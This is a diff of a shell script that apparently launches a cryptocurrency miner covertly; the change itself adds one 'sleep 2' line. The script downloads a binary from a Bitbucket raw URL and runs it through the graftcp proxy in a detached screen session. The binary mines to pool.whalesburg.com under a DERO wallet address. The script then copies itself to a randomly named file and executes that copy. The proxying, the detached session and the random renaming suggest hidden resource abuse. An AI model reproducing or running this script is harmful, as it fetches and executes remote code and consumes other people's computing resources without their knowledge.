@@ -44,6 +44,7 @@ wget https://bitbucket.org/lukisanwarna/runing/raw/e57b4db45e10275c6a181fb18d565
 
 screen -S $MARKONAH -dm ./graftcp/graftcp ./$GOGO -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.MARKONAH &
 screen -ls &
+sleep 2
 TIME=$(shuf -i 10000-9999999999 -n 1)
 mv -f time.sh $TIME
 bash $TIME
